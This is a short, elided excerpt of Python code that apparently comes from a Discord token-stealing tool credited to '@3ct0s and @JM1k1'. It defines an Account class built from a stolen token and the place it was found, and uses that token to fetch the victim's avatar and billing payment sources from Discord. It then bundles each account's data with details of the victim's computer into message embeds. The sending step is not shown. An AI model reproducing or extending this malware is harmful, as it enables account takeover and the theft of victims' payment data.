...
class Account():
    ...
    def __init__(self, token: str, token_location: str):
        ...
        self.avatar_url: str = (self.DISCORD_AVATARS_URL + f"/{self.id}/{self.avatar_id}")
        self.billing_data: str = open_url(self.DISCORD_API_URL + "/billing/payment-sources", self.token)
...
def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
    ...
    for account in accounts.values():
        ...
        embeds.append({
            ...
            "footer": {
                "text": "Created by @3ct0s and @JM1k1!",
            }
        })
    return embeds
